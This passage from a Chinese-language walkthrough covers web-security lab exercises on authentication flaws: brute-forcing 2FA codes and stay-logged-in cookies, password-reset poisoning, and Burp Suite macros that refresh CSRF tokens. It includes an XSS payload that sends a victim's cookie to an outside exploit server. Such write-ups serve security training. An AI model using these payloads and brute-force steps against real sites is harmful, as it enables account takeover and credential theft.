- 响应状态码302，跳转到/my-account页面![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSCsV503Q6l4AQFf79eEasPSdjWFpMJogMibGaI5s2gSibtth2ia7OHibPVQ/640?wx_fmt=png&from=appmsg "")  
尝试直接将第三个数据包的cookie改成carlos，但是cookie和验证码做了绑定![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSznZMc9tBafCfNM213yN1eEMalibV5fKyUYyjtd3miccBSHaMonOHwKdQ/640?wx_fmt=png&from=appmsg "")  
  
  
### 爆破邮箱验证码  
  
先退出wiener用户，再输入wiener：peter，拦截第一个请求包，然后放行![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS8IQGpYZ2gB3DQduWC8fic9dC1sua3R1XCTp39h2Plp26GiaSzzBINxCw/640?wx_fmt=png&from=appmsg "")  
  
  
获得第一个响应包，里面分配了cookie![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSWBSRhiacQ5xLiaRTJeSsAP6WHnsfm3wHJQbsnqCIkkvVjYPxmNYRbzXw/640?wx_fmt=png&from=appmsg "")  
修改cookie中的用户名，改成carlos，然后放行，关闭拦截，放行所有的数据包。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSs9iaG6SZfZT74kHfVY6CkWzicwLy5wUdiaVQhyag0F3WlDBEhBg9SXksw/640?wx_fmt=png&from=appmsg "")  
  
  
此时，cookie中的用户名是carlos，客户端会向目标用户发送验证码，我们并不知道验证码，但是邮箱验证码只有4位，我们可以利用逻辑缺陷：提交邮箱验证码没有次数限制，进行爆破。 使用 “Intruder” 功能，修改cookie中的用户名为carlos，将验证码字段的值添加到选区。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSiaXa1bibrrowoT8KG1y7crcAQRIoTRXfXbBnRTrZkJj0mFTJ0JpxhKOA/640?wx_fmt=png&from=appmsg "")  
payload![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSV2BibZfAsGhv2Bib7NfajmZdPlFiaTOmlHuXOlBuHIHd9OJNtq277dP0g/640?wx_fmt=png&from=appmsg "")  
开始攻击，查看结果，有异常条目跳转到302![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS09S5xzO0OiccNrIjLzGuVRvWF4ZkBOJDK6FffmqTt3Pl0c8ulqRxw5Q/640?wx_fmt=png&from=appmsg "")  
再抓一次提交验证码的请求包，输入正确的验证码，将cookie的用户名改为carlos即可登录![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSReh8wHxCbxB9jb74FAdxs59l9DQbCCGfww5TH7BOxZXT195oS92IQw/640?wx_fmt=png&from=appmsg "")  
  
## 2.10 实验：暴力强制保持登录状态的cookie  
  
**实验目标：**  
- 该实验存在”保持用户登录状态“功能  
  
- 暴力破解卡洛斯的cookie来访问他的“我的帐户”页面。  
  
登录的时候勾选”stay logged in“![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSiaht5IQib63icl76WLQqec8Ww4cYTkeJ1iboyibtUroHPCuBLF6NBUerfCg/640?wx_fmt=png&from=appmsg "")  
有一个stay-logged-in的cookie![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSXyFkMoOyrNicPlzUXlM57yM183Soh847W8wX45fVqmcgDAJ5hde2uvw/640?wx_fmt=png&from=appmsg "")  
登录后的页面也有![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSlNORibTHfPv6ibCkMsbicrXGDwp2gW6R8Wc1ialLVqAIYFCicibYxrJT2qaQ/640?wx_fmt=png&from=appmsg "")  
抓取一个 GET /my-account 的数据包，随便填写stay-logged-in的值，登录失败，说明cookie不正确![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSA1fyCDtyGDTa6JqOZPcmwA0TDqkxOgDhukZQpakj4Z0z1511xia0Wxg/640?wx_fmt=png&from=appmsg "")  
  
  
根据提示，是base64加密，扔去decoder解密，由用户名和密码的加密构成![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSGIGsVUGCPIBgXHAcYP42aLbUE5skLibOZxwicOzxV7nFM1icn6foMr18Q/640?wx_fmt=png&from=appmsg "")  
cmd5解密后是密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSRibUltnibIpLjlia1xFSFUzg3g4CYLonc9nIO7MTk8EcqX3FBsiakskl8g/640?wx_fmt=png&from=appmsg "")  
那么爆破密码就需要设置加密规则 先退出用户，发包到intruder，对被攻击用户登陆状态的stay-logged-in值进行爆破![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSRT0ib8KHNRyoLvWlAHN1oMqbwxicPAj2w2NDhT1curvnZnHsgFnJtVAQ/640?wx_fmt=png&from=appmsg "")  
先导入密码字典![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSuQwtkPdESQ5icHyn9iaEygm0uEykGpiaFsHRlNAB3my13u5RiaxwrhynFw/640?wx_fmt=png&from=appmsg "")  
再设置加密规则，先对密码进行md5加密![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS0nVdC4YFxjDCiaicIMRtKiazYbgd0g2ImtjunDKKpgSLKictVRyySguopQ/640?wx_fmt=png&from=appmsg "")  
再添加被攻击账号carlos，前缀**carlos:**  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS0m1IjXrfiatwpdMMy6K0NclRBuzPxvaVY2kjktSlzUtjKfkwzoiaHcTQ/640?wx_fmt=png&from=appmsg "")  
  
  
再添加base64加密  
  
爆破，直接200，登录成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS2FKRysjlfnyOhNzNMpIibK0fTCbETV9Ejdte426ZQ2dCicMZf81ay1bg/640?wx_fmt=png&from=appmsg "")  
  
## 2.11 实验：离线密码破解  
  
**实验目标：**  
- 用户密码的hash存在cookie中，注释功能包含xss漏洞。  
  
- 获得carlos stay-logged-in的cookie，用来破解密码，登录并删除账户。**xss漏洞利用**  
view post可以发表评论![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSHKEFibqVVicibMPwoyel9Alg7YSZxYiasEkvqCl1paNrsdynwQl5hgvYcg/640?wx_fmt=png&from=appmsg "")  
在评论功能处插入反射型xss![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSzxaWFAh95VftFBQ3JRM4RSwI9Lvz6tibtWoXSX2dEopWmRLl4VCYBoQ/640?wx_fmt=png&from=appmsg "")  
  
  
提交后返回，有弹窗，xss漏洞存在![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSfpg1AYibqVstqmHFMWqphPRxHVsIyneCVD1YQ4zq2cnbCYFMaQc98XQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSibjelN7tyg58grskNIjv0icGtHiaAruJ7nLNNj4XBaCEUMQl4K1OO3dAw/640?wx_fmt=png&from=appmsg "")  
  
  
有一个漏洞服务器![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSczPPYhfo228yyRQdMVJIPJ8ABfNz97xbOBsywJr3AmicdwAYjjoTyMQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSdyr4MWxW7M4icvvRnW255KSIL4JuPt3RnoOj6K9HqLvIuHbmlZeTPGg/640?wx_fmt=png&from=appmsg "")  
  
  
窃取cookie payload，实验室会模拟 carlos 用户去访问新闻页面，并受到 XSS 攻击，我们设置的 Payload 会获取 carlos 用户的 Cookie，然后发送到服务器上。  
```
<script>document.location='https://域名/'+document.cookie</script>

<script>document.location='https://exploit-0a8800c604d4bab780d9078201aa006e.exploit-server.net/'+document.cookie</script>

```  
  
提交![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS9GWr6XiasXuGZaD060CbBDiapTbgDkh7K7PiaaeFv7iaPeP1hzicJKzFXgQ/640?wx_fmt=png&from=appmsg "")  
查看日志，得到cookie![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSyNmm1ibjdmyVFDst8yhqxgm2yIDXXpbXVE9Oo6IZZjWzCibQXUicOMuIA/640?wx_fmt=png&from=appmsg "")  
抓一个my-account的包，将carlos的cookie填入，放行即可登录![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS2U0pKrlicH6lpgsgTUpLFcOUTApPTNich3VbFyn9dbO5jiaWBEibiboP0gQ/640?wx_fmt=png&from=appmsg "")  
登录后删除密码。发现还是需要密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSYqicrBRdicKibkmcTIhEeIq5FEpB5ITOicVefTJDqspupvakUnh03v5hyg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSeTw9keS05kibfztg4U6tb3ryznW2S2TyGeWnlL944VGoxxVYEicXxu0g/640?wx_fmt=png&from=appmsg "")  
还是老老实实解密![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSEBfUqjgrD7n70ER2Y7PRPJIzgjicxyUAjk7PQntpoDvIibO778ib925KA/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSL9UoLpjKtkoOYJwC7Y43qiausXiaqONPunDBVcK7wkVHGcZU7qq4usRg/640?wx_fmt=png&from=appmsg "")  
  
## 2.12 实验：通过中间件进行密码重置中毒  
  
**实验目标：**  
- 该实验室存在 “密码重置功能” ，但该功能容易受到 密码重置投毒 的影响。  
  
- 利用 投毒攻击 来重置 carlos 用户的密码，然后登录并访问其账户页面。  
  
点击忘记密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSFVJJrK1N7NicEfV2oVuHrDb24VQptZ5N1ZGf7latjjPZaT4ibPkd5Ylw/640?wx_fmt=png&from=appmsg "")  
输入用户名提交![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSIV6yPJ06gtMnricgk53nvKOqQ0xQDib17iawFeggQicQwm29WyU6rcpS4A/640?wx_fmt=png&from=appmsg "")  
  
  
第1个数据包，应用程序会向用户发送重置密码链接![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS4K5GXqOTYLJ1iaLpYaZmBcrcHtkTQBmnarxXEocndAng03FBvgJtmhg/640?wx_fmt=png&from=appmsg "")  
第2个数据包，在电子邮件中点击链接，进入密码重置页面，有临时token![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS5VzMdWU1WPfGqz6B43UWvhAwX0fV0Kv2p7jcIDicEm6ofnODAuSdCSA/640?wx_fmt=png&from=appmsg "")  
第3个数据包，在密码重置页面中输入新的密码，然后提交表单，成功修改密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSevU23rAWO0GbKz0dCTWchI29hL5Vicq5w1GtvLhWmcibAvfB4ibWjRbbg/640?wx_fmt=png&from=appmsg "")  
本实验中X-Forwarded-Host标头是受支持的，使用它来将动态生成的重置链接指向自己控制的任意域。 抓第一个包，在下方添加一个新的 X-Forwarded-Host 标头  
- X-Forwarded-Host：漏洞利用服务器的主机名。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSaRG8yJHbbRcBxvZRn4DScfSpLeCicMCZIzQqWryYQdE734Oia1xmoc7w/640?wx_fmt=png&from=appmsg "")  
  
  
查看邮箱客户端日志![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSG2O2gSN1LWHQD1sia3enpMiaFaicpv2r8TPMAqL2Bib5cXkZqr6eeqEGnw/640?wx_fmt=png&from=appmsg "")  
该链接的主机名有所不同，它的主机名被成功投毒了。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSSASyL5bAdwceWhvlFheX0El3GyuOYwGaZge8Q39qACPTqrvSEh8Yicg/640?wx_fmt=png&from=appmsg "")  
实验室会模拟 carlos 用户去访问密码重置链接，但链接的主机名已经被污染，所以该请求会被发送到我们的服务器上，从而获得 carlos 用户的 token 值。 修改刚刚的数据包，将 username 字段的值修改为carlos  
，然后发送。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSk7XTSHTy5vrQExLOInjSlQAeRFUaWt0nwibpjmdo5OsxSm4Qn7OGxPw/640?wx_fmt=png&from=appmsg "")  
查看邮箱客户端日志，获取临时token![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSG2O2gSN1LWHQD1sia3enpMiaFaicpv2r8TPMAqL2Bib5cXkZqr6eeqEGnw/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSYlCibqZ9J5z9diaLqXVUAxvdjB9liafPKfLBDhpBPXRCVmtmIwcSHDPrw/640?wx_fmt=png&from=appmsg "")  
点击密码重置页面的url，把token替换成carlos的token进行访问，然后修改密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSm1m2QWZra0PUbtia0FD1zOvBczHvyLGWmFH6467ZADO93MwqVDZoD4A/640?wx_fmt=png&from=appmsg "")  
登录成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSS5ia1H9IibA8gN2hqLCdFNhWZY00wShs7g7RMyIDl4Bf1VKoAyH4Y6cg/640?wx_fmt=png&from=appmsg "")  
  
## 2.13 实验：通过密码更改进行密码暴力破解  
  
**实验目标：**  
- 该实验室存在 “密码更改功能” ，但该功能容易受到 暴力破解攻击。  
  
- 利用该功能的逻辑缺陷，来暴破 carlos 用户的密码，然后登录并访问其账户页面。  
  
第一个数据包，登录的包![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSn1W6Aiczibhk5vUOmDiaOvWernnmOIsT8KLicblxm33P9Pvt7tP2TTxicCA/640?wx_fmt=png&from=appmsg "")  
第二个数据包，请求包![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS3FKVE1UmcoCkAo1HrwSTaIhRBQhqkGZIYlfDh2JmXmsA0X0iagUBDjQ/640?wx_fmt=png&from=appmsg "")  
第三个数据包，更改密码的包，![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSph8HZk8709PgjZfpJejdibKY6iaq2qvyh4MAfzl5JUdGcjwxRXqqOUeA/640?wx_fmt=png&from=appmsg "")  
  
  
第三个包无法重复利用  
- 成功修改密码之后，自动注销登录状态，数据包失效。  
  
- 原密码输入错误，自动注销登录状态，数据包失效。 使用不同的输入组合，测试响应信息是否有所不同。 错误的旧密码和两个不同的新密码，返回 Current password is incorrect![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSfQHWCUhpV3icPLCjvd0tibnqKaAGCYdPoVUqx2enXb9czribd8X6mcrdA/640?wx_fmt=png&from=appmsg "")  
正确的旧密码和两个不同的新密码，返回 New passwords do not match![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSXnr6QXImicFd0VufLWJrHAJt8hS4BSPtBRITutiaBaoI1M4pX8e2LicEA/640?wx_fmt=png&from=appmsg "")  
那么可以利用这两种不同的响应特征来进行爆破，需要注意两个新密码不能相同，否则爆破会302跳转![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSGZvj379bfMAHTWBH8WQmeWyyURnBuvIPo3HO35vNNXYib4ibiaC8x9dZQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSvCBmODtQ1hfAwonEgdqXtL63vQGBpG3rmWZBHu6ZWQ82KprPicRssdw/640?wx_fmt=png&from=appmsg "")  
爆破成功![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSoqk4Mmx8SBMLicXeD0KqKZgLSzdDHwl5Exb3T1Y43w3WQdhSBb6bnXQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS6vqFhSW8znTLpfTmiboexg7Kl6gAJC3SR3LEuWicWeqYclSiaymFFfjQA/640?wx_fmt=png&from=appmsg "")  
  
## 2.14 实验：破坏暴力破解保护，每个请求多个凭据  
  
**实验目标：**  
- 蛮力保护存在逻辑缺陷，破解实验室破解卡洛斯的密码 第一个数据包，登录页面提交json格式的账户和密码![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS7nMfUy2icTUJTyrffvcIicCSnCaIyINU8gDmLftib47eTYQ1YY6o4a6CA/640?wx_fmt=png&from=appmsg "")  
  
  
将密码的单个字符串值替换为包含所有候选密码的字符串数组 用notepad++处理一下密码字典  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSrzkTmzibaohTcy58dqIG190PDdxAvOuDmib5uFEBICEnXI9TvmkEyx3Q/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSev2TJEHcag0ETTJ2e0Q4VNBko3tS1gkFlaSHCtunUP9ZVQm3bLm21A/640?wx_fmt=png&from=appmsg "")  
最后再给第一个和最后一个补全双引号即可 粘贴到repeater，发送，出现302，右键，选择在浏览器中响应![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSu3AyFeAt65SVHHHgz2r8cmpleLuMcJtr3CtaC11zu35Uicz5sRkrfpw/640?wx_fmt=png&from=appmsg "")  
直接跳转登录页面![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSbKBCI4qkl9V6prksADXWicDXCItYicFEGe3OmqJwSbpFhibKicNfBOP6eA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS6lmH3OOWe85cPiaVGydre1GaeR6sX89XhicWx1FEyeKYdBbzjs6Xsp5g/640?wx_fmt=png&from=appmsg "")  
  
image.png  
## 2.15 实验：使用蛮力攻击的2FA旁路  
  
**实验目标：**  
- 该实验室存在双因素身份验证，但该验证容易受到 暴力破解攻击。  
  
- 你已经拥有了 carlos 用户的密码，但无法获取他的 电子邮件验证码。  
  
- 以 carlos 用户的身份登录，然后对 邮件验证码 进行暴力破解，最后访问其账户页面。  
  
第一个数据包 /login，输入账号密码请求登录，会附带一个csrf值![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrS9hB48KlCqqs9FdPR417mjpxrcM9hRhUXWlZCn1HcDbtUwXzicdqyYoQ/640?wx_fmt=png&from=appmsg "")  
  
  
第二个数据包/login2，提交邮箱验证码，也会附带一个csrf值  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSzh6jLqtveLCqh22F4H9ia5mXho82oqBJddpM9FLVibcDoXu5ML0gfrHg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSiaSic2M8BNCrXwpAibATXsNNUOOiabvfLmI7s3qkpJNnGAXUW0q4uyzsiaA/640?wx_fmt=png&from=appmsg "")  
随便提交验证码，抓包![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSGibre9WItdG81DKkPe9mDeOJlK6sktrfiafLibiajqF24y3M5FtFnqnfCw/640?wx_fmt=png&from=appmsg "")  
  
### 宏（BurpSuite自带功能）  
#### 创建宏  
  
BurpSuite 中的 “宏” 是一个类似于 “按键精灵” 的东西。可以录制一段数据包，帮用户执行某些操作，例如 自动发送请求、自动更新参数 等。 打开 BurpSuite 窗口，添加一个宏，点击 “Settings --> Sessions --> Macros --> Add”。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSGeOERt5WxEEctc33zRMOLFbqIymkMHtZTtHlXZpG4Jt1jQ5gN5WtiaQ/640?wx_fmt=png&from=appmsg "")  
点击 Add 之后，会自动跳出一个窗口，窗口里面是 BurpSuite 的历史数据包，我们选择其中的三个请求（自己提前抓好数据包）：  
- GET /login  
  
- POST /login  
  
- GET /login2![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSJkaSy8sLKP1YfnrhFLwWQldVrJBQPCiaKVwITibWNJksFhMickFmceYvg/640?wx_fmt=png&from=appmsg "")  
  
  
#### 配置第1个请求  
  
接着，选中第 1 个请求，然后点击旁边的 “Configure item” 对其进行配置。 然后点击 “Add” 添加一个自定义参数。 当前请求是 GET /login ，用于获取第一个 csrf token 。  
- 参数名称：csrf  
  
- 在下方选中对应的数据 然后点击 “OK” 保存。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSDONnjVA4c45FyVUXRYI7KxxDVAj8DUhBDr905bFrfUuMn89oDeCdMA/640?wx_fmt=png&from=appmsg "")  
  
  
#### 配置第2个请求  
  
选中第 2 个请求，点击旁边的 “Configure item” 对其进行配置。  
  
当前请求是 POST /login 登录请求，设置其 csrf 参数，选择 “Derive from prior response”（源自先前的响应）。  
  
在发送 POST /login 请求时，csrf 参数会自动更新为上一个请求的配置项。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSRWzvNsBXAO5t5tr0TVPWZtwJg5KDa3jrsKAnX008szyJJ4WogHibicTg/640?wx_fmt=png&from=appmsg "")  
  
#### 配置第3个请求  
  
选中第 3 个请求，点击旁边的 “Configure item” 对其进行配置。  
  
然后点击 “Add” 添加一个自定义参数。 当前请求是 GET /login2 ，用于获取第二个 csrf token 。  
- 参数名称：csrf  
  
- 在下方选中对应的数据  
  
然后点击 “OK” 保存。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSSYQyv8ILITYXuVPWIWKT38NX7FfY1H1OKcsJcOCTZRDvyvwBPKf2cg/640?wx_fmt=png&from=appmsg "")  
测试，状态码正常![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSAn6aqgvMC2kWoQS0o0sLx54jmINRjzSvqldakXJzNAViavUFXHnFKaQ/640?wx_fmt=png&from=appmsg "")  
  
#### 添加处理规则  
  
创建宏之后，宏并不会自动运行。  
  
需要创建一个处理规则，将宏应用到相应的请求当中。  
  
“Sessions --> Session handling rules --> Add” 切换到 “Details” 选项卡，更改规则名称，例如 auto-flush-csrf2 ，方便寻找。  
  
然后选择下方的 “Add --> Run a macro” 添加规则操作，操作类型为 运行宏。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSySPiasnsmrmdYEQ3Zxd9Vibmu1GXdq6qYBCAZ4zmYHCydBOiasxmsM8qA/640?wx_fmt=png&from=appmsg "")  
切换到 “Scope” 选项卡，设置该条规则的执行范围。  
  
工具范围：Repeater 和 Intruder 勾选上（默认已经勾选）。  
  
URL范围：这里选择 “Use custom scope”（自定义范围）。然后点击 “Add” 添加一个 URL，把 /login2 的路径添加进去，如图。  
  
最后点击 “OK” 保存。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSVwgqw2J56qEUdcbXd9CvKgdtu80PolRUHYGTI4x2yIq4hsEoIKvYog/640?wx_fmt=png&from=appmsg "")  
准备进行验证码爆破![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSpLBuS47wCXvHWVzZYXiaedzN7TMcmcQoJ58397Azq1tm4uWv6kKnHhA/640?wx_fmt=png&from=appmsg "")  
一个特别要注意的点，请求当中是带有 csrf token 的。如果请求过快，会导致之前的 csrf token 过期，此时会暴破失败。  
  
所以我们只能使用 “单线程” 来进行暴破（很慢）。  
  
设置 1 个线程，然后点击 “Start attack” 开始攻击。![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSwLCze9cBicZJichZKsYgmrwOwgDB1o9SiaNrFxMIY77rItYpTBOow4hHg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zkFLzGMx1jsRkWOfN8ZnZOouaa0F3xrSw3JE2icBmGmLZPZ1MPgBOXfUq1MtshuQEmicWSyNhKPHK0pQQkO9kNqg/640?wx_fmt=png&from=appmsg "")  
  
  
  
